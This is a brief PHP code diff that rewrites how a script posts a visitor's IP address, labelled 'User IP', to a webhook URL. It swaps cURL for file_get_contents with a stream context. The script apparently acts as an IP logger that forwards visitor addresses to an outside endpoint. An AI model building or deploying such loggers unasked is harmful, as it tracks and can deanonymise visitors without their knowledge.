@@ -12,12 +12,13 @@ foreach ($hdrs as $h) {
 
 $pl = json_encode(['content' => "User IP: $ip"]);
 
-$ch = curl_init($wh);
-curl_setopt_array($ch, [
-    CURLOPT_POST => true,
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
-    CURLOPT_POSTFIELDS => $pl
-]);
-curl_exec($ch);
-curl_close($ch);
+$options = [
+    'http' => [
+        'method'  => 'POST',
+        'header'  => 'Content-Type: application/json',
+        'content' => $pl
+    ]
+];
+
+$context = stream_context_create($options);
+file_get_contents($wh, false, $context);
